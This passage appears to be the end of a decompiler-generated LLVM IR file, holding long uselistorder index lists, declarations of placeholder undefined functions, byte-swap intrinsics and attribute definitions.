757, 201, 758, 759, 760, 761, 762, 449, 763, 764, 765, 766, 767, 768, 145, 771, 648, 772, 773, 59, 60, 98, 774, 775, 776, 649, 777, 778, 779, 780, 650, 781, 782, 61, 62, 97, 783, 784, 785, 786, 787, 202, 204, 769, 203, 770, 205, 788, 146, 858, 863, 864, 859, 860, 861, 866, 867, 868, 206, 869, 870, 871, 872, 873, 862, 865, 874, 147, 879, 880, 881, 450, 968, 451, 882, 1453, 1454, 1455, 207, 1456, 1171, 1170, 1172, 1124, 1173, 884, 883, 885, 969, 970, 971, 1579, 1580, 1581, 1582, 208, 1583, 1584, 1585, 1174, 1175, 372, 373, 452, 1590, 654, 1591, 453, 1592, 1593, 454, 1594, 1595, 652, 209, 357, 1596, 653, 1597, 455, 83, 1598, 1599, 456, 1614, 1615, 1618, 651, 356, 1619, 411, 149, 148, 1616, 1617, 1586, 1587, 655, 210, 333, 725, 13, 14, 1610, 1005, 888, 1609, 1176, 150, 1177, 118, 212, 1178, 656, 211, 1179, 1180, 1600, 1601, 1602, 1603, 457, 1604, 151, 889, 890, 63, 64, 99, 1125, 1126, 88, 359, 1130, 1127, 1128, 657, 1129, 1131, 658, 1132, 1133, 1134, 1135, 65, 66, 100, 1136, 213, 1137, 1138, 1139, 1141, 1140, 358, 726, 728, 727, 214, 729, 730, 731, 458, 732, 152, 1588, 1589, 153, 460, 461, 1605, 459, 154, 155, 1186, 1187, 1188, 1189, 1190, 215, 1191, 1192, 1193, 1194, 1195, 1196, 216, 1181, 462, 1182, 1183, 463, 1184, 1185, 156, 659, 217, 218, 1142, 464, 219, 1143, 1144, 1145, 1146, 1147, 226, 220, 221, 224, 222, 225, 227, 229, 228, 223, 1197, 1198, 1222, 1223, 157, 1199, 1200, 233, 231, 232, 1201, 1202, 239, 238, 167, 230, 1203, 1204, 1205, 1206, 1207, 1208, 379, 378, 412, 465, 1209, 1210, 1211, 84, 1212, 235, 234, 236, 237, 166, 1213, 1214, 360, 1215, 1216, 126, 1217, 1218, 1219, 1220, 1221, 15, 16, 891, 892, 85, 17, 413, 466, 1224, 1225, 1108, 1107, 1227, 1226, 1079, 1078, 1229, 1228, 961, 1230, 893, 1232, 1231, 1038, 895, 894, 1167, 1620, 1621, 101, 158, 972, 973, 974, 240, 886, 887, 159, 241, 975, 980, 981, 982, 983, 242, 976, 243, 977, 978, 984, 467, 1233, 1606, 1607, 1608, 896, 1235, 1234, 985, 897, 1004, 898, 899, 900, 1611, 1612, 1613, 979, 18, 1236, 1237, 1238, 1239, 123, 1240, 244, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 245, 660, 663, 661, 662, 1248, 1249, 1250, 1251, 1252, 1253, 19, 1457, 1458, 1459, 124, 1460, 1461, 1462, 1463, 1464, 246, 1465, 664, 667, 665, 666, 1466, 668, 168, 247, 1254, 1255, 119, 370, 1256, 1257, 67, 160, 669, 361, 21, 20, 248, 1258, 249, 670, 22, 362, 250, 251, 252, 68, 253, 468, 901, 986, 987, 988, 1260, 1259, 1261, 1262, 1263, 1264, 43, 254, 1265, 1266, 1267, 255, 113, 114, 469, 423, 424, 1268, 257, 256, 258, 1269, 259, 1270, 1271, 260, 1148, 1149, 470, 261, 262, 263, 1272, 264, 1273, 265, 266, 902, 267, 903, 904, 905, 909, 705, 713, 714, 716, 701, 115, 69, 336, 337, 702, 715, 703, 675, 704, 706, 676, 707, 677, 708, 678, 709, 679, 710, 680, 711, 681, 712, 717, 718, 471, 719, 125, 906, 671, 907, 472, 908, 364, 363, 910, 911, 912, 913, 269, 268, 914, 915, 916, 682, 334, 917, 104, 105, 335, 918, 102, 103, 473, 920, 921, 672, 922, 923, 924, 925, 926, 474, 927, 928, 929, 169, 674, 930, 931, 932, 673, 933, 934, 475, 935, 936, 939, 940, 941, 270, 937, 271, 938, 272, 919, 1109, 1110, 942, 476, 943, 945, 273, 946, 947, 948, 949, 950, 951, 952, 275, 274, 953, 477, 954, 478, 955, 479, 944, 956, 380, 959, 480, 960, 481, 957, 958, 482, 963, 683, 278, 277, 276, 366, 483, 962, 365, 964, 965, 966, 70, 967, 279, 484, 120, 989, 990, 991, 992, 369, 993, 994, 995, 368, 996, 997, 998, 999, 280, 1000, 1002, 1001, 161, 162, 281, 367, 283, 282, 1003, 284, 285, 86, 286, 1006, 1007, 127, 128, 87, 1008, 287, 288, 338, 1009, 290, 1010, 291, 289, 485, 1011, 1012, 1014, 1013, 1015, 292, 1016, 1017, 414, 1018, 1019, 1020, 293, 294, 1021, 295, 1022, 296, 1023, 297, 1024, 1025, 116, 1026, 1027, 298, 1028, 1029, 1030, 299, 1032, 300, 339, 1033, 1031, 1034, 1035, 1036, 301, 1037, 1039, 303, 1041, 1042, 302, 1040, 1043, 163, 487, 488, 1044, 1045, 489, 490, 1046, 486, 1047, 1048, 304, 1049, 1050, 305, 306, 1051, 1052, 164, 1053, 1054, 23, 24, 25, 26, 1055, 1056, 307, 416, 1057, 1058, 491, 1059, 492, 1060, 493, 1061, 494, 1062, 495, 1063, 496, 1064, 415, 1065, 497, 1066, 1067, 1068, 308, 1070, 1071, 309, 340, 1072, 1069, 1073, 1074, 1075, 27, 28, 29, 1076, 310, 1077, 1080, 1081, 71, 1082, 311, 1083, 1084, 312, 341, 1086, 1085, 498, 1087, 1089, 1090, 1091, 1092, 499, 1093, 30, 31, 32, 1088, 33, 34, 1094, 313, 1095, 1096, 314, 1099, 1100, 1101, 342, 1102, 1097, 1098, 1104, 1103, 1105, 315, 1106, 1111, 1112, 316, 1114, 1115, 1116, 317, 500, 1118, 1117, 1113, 1120, 1121, 1119, 1122, 318, 1123, 381, 1150, 501, 1151, 72, 1152, 129, 1153, 1154, 1155, 382, 1156, 502, 1157, 1158, 1159, 44, 371, 1160, 1161, 1274, 319, 1275, 1168, 320, 1169, 321, 1276, 720, 721, 722, 723, 1277, 724, 1278, 1279, 1280, 1281, 322, 323, 503, 1282, 1283, 685, 686, 687, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 693, 1297, 1298, 1299, 1300, 1301, 508, 1302, 1303, 694, 1304, 1305, 1306, 688, 1307, 689, 324, 325, 326, 1308, 1309, 1310, 1311, 695, 1312, 1313, 165, 1314, 1315, 696, 1316, 327, 1317, 1318, 1319, 697, 504, 505, 1320, 1321, 698, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 506, 1336, 1331, 1332, 1333, 1334, 699, 1335, 700, 1337, 507, 1338, 1339, 1340, 1341, 1342, 1343, 690, 1345, 1346, 1347, 1348, 1349, 383, 1350, 1353, 1354, 1351, 1352, 329, 328, 1355, 1356, 1357, 1358, 330, 1359, 1360, 343, 1361, 106, 107, 344, 1362, 108, 109, 509, 1363, 1344, 1364, 635, 684, 691, 692, 1365, 1366, 1367, 1368, 1369, 1370, 417, 1371, 418, 1372, 419, 1373, 1622, 420, 733, 421, 422, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637 }
  uselistorder i32* @r4, { 99, 913, 914, 915, 916, 917, 935, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 9, 932, 933, 934, 936, 937, 938, 939, 940, 941, 942, 943, 106, 107, 108, 109, 152, 10, 153, 154, 155, 11, 156, 157, 158, 159, 160, 161, 162, 0, 12, 163, 164, 165, 166, 167, 168, 169, 170, 229, 230, 944, 100, 101, 102, 65, 946, 947, 948, 3, 951, 66, 945, 721, 722, 110, 111, 112, 113, 114, 115, 116, 117, 118, 952, 953, 171, 172, 13, 2, 173, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 14, 174, 175, 176, 177, 178, 179, 180, 181, 200, 15, 201, 202, 182, 183, 185, 16, 186, 189, 17, 190, 191, 18, 192, 193, 19, 194, 195, 20, 196, 197, 21, 198, 56, 199, 184, 203, 22, 204, 205, 206, 207, 208, 209, 210, 187, 188, 103, 104, 105, 119, 120, 121, 122, 23, 123, 24, 25, 124, 125, 126, 127, 128, 129, 130, 135, 136, 26, 137, 138, 27, 139, 140, 28, 141, 142, 29, 143, 144, 30, 145, 146, 31, 147, 148, 131, 132, 133, 134, 149, 150, 151, 211, 212, 213, 32, 214, 215, 216, 33, 217, 218, 219, 220, 221, 222, 52, 223, 224, 225, 226, 227, 228, 231, 232, 233, 234, 372, 235, 949, 950, 726, 727, 728, 729, 730, 731, 654, 655, 373, 374, 970, 971, 972, 732, 733, 64, 975, 53, 976, 977, 978, 994, 996, 997, 998, 995, 979, 984, 992, 993, 973, 985, 986, 987, 988, 734, 735, 4, 34, 736, 35, 737, 738, 739, 980, 981, 656, 91, 92, 93, 94, 95, 96, 974, 982, 983, 236, 237, 238, 239, 740, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 36, 756, 757, 758, 759, 741, 742, 743, 657, 658, 659, 660, 661, 662, 663, 664, 665, 37, 666, 667, 668, 669, 670, 671, 672, 673, 674, 760, 782, 783, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 57, 774, 775, 1, 776, 777, 778, 779, 780, 781, 243, 244, 245, 784, 785, 619, 620, 621, 624, 625, 626, 622, 623, 786, 787, 788, 789, 790, 791, 792, 562, 563, 564, 567, 568, 569, 565, 566, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 246, 247, 248, 249, 250, 251, 252, 375, 376, 377, 378, 379, 380, 381, 240, 241, 242, 382, 383, 384, 385, 8, 386, 387, 388, 389, 390, 391, 392, 809, 810, 811, 814, 815, 816, 812, 813, 253, 254, 255, 256, 257, 258, 989, 990, 991, 259, 260, 261, 393, 394, 395, 396, 397, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 817, 818, 819, 820, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 296, 297, 298, 299, 89, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 90, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 318, 319, 320, 321, 322, 329, 330, 331, 332, 333, 334, 5, 323, 324, 325, 326, 327, 328, 314, 315, 316, 317, 627, 628, 629, 630, 631, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 354, 355, 356, 357, 358, 359, 348, 349, 350, 351, 352, 353, 97, 360, 361, 362, 363, 55, 365, 364, 54, 366, 367, 368, 369, 370, 6, 371, 398, 38, 7, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 424, 418, 419, 420, 421, 422, 423, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 39, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 40, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 41, 497, 42, 498, 43, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 44, 525, 45, 526, 46, 527, 47, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 48, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 632, 633, 634, 635, 49, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 713, 710, 711, 712, 714, 715, 716, 717, 718, 719, 720, 821, 822, 723, 724, 725, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 50, 852, 58, 853, 854, 63, 855, 857, 858, 859, 62, 856, 51, 860, 861, 862, 863, 864, 865, 866, 61, 867, 868, 869, 60, 870, 871, 872, 59, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 98, 912 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
